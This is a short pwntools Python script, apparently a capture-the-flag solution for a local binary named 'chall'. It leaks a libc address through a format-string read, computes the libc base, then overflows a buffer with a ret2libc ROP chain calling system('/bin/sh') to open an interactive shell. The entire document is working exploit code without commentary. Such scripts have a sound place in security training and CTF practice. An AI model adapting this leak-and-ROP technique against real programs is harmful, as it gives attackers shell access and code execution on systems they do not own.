from pwn import *
elf = context.binary = ELF("./chall")
p = process()
libc = elf.libc
offset = 1016
p.sendline("yay")
p.sendline("%5$p")
p.recvuntil(b"email provided: ")
__IO_2_1_stdin_leak = int(p.recvline().strip().decode(),16)
__IO_2_1_stdin_offset = libc.sym['_IO_2_1_stdin_']
libc.address = __IO_2_1_stdin_leak - __IO_2_1_stdin_offset
system = p64(libc.sym['system'])
bin_sh = p64(next(libc.search(b'/bin/sh')))
rop = ROP(libc)
rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
ret = p64(rop.find_gadget(['ret'])[0])
payload = b'A'* offset + rdi + bin_sh + ret + system + p64(libc.sym['exit'])
p.sendline(payload)
p.interactive()